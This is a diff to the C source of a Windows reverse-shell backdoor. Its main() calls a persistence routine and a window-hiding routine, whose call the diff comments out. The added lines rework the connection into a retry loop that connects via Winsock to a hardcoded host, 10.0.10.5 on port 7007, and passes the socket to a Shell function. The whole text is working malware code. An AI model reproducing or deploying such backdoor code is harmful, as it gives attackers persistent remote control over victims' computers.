@@ -18,7 +18,7 @@ char *slice(char *ch, int from, int to);
 
 int main(){
 
-    hideWINDOW();
+    //hideWINDOW();
     persistence();
 
     struct sockaddr_in ServerAdd;
@@ -32,23 +32,42 @@ int main(){
 		return 1;
 	}
  
-    int sock;
+    while(1){
 
-    sock = socket(AF_INET, SOCK_STREAM, 0);
+        struct sockaddr_in ServerAdd;
+        unsigned short Port = 7007;
+        char *ServerIP = "10.0.10.5";
 
-    if (!sock){
-        printf("SOCKET ERROR!");
-        return 1;
+        WSADATA wsa;
+        
+        if (WSAStartup(MAKEWORD(2,0), &wsa))
+        {
+            return 1;
+        }
+        
+        int sock;
+
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+
+        if (!sock){
+            printf("SOCKET ERROR!");
+            return 1;
+        }
+
+        ServerAdd.sin_family = AF_INET;
+        ServerAdd.sin_addr.s_addr = inet_addr(ServerIP);
+        ServerAdd.sin_port = htons(Port);
+
+        while(1){
+            int connected = connect(sock, (struct sockaddr *) &ServerAdd, sizeof(ServerAdd));
+            if (connected == 0){
+                Shell(sock);
+                break;
+            }
+            Sleep(2);
+        }
     }
-
-    ServerAdd.sin_family = AF_INET;
-    ServerAdd.sin_addr.s_addr = inet_addr(ServerIP);
-    ServerAdd.sin_port = htons(Port);
-
-    connect(sock, (struct sockaddr *) &ServerAdd, sizeof(ServerAdd));
-
-    Shell(sock);
-
+        
     return 0;
 }
 
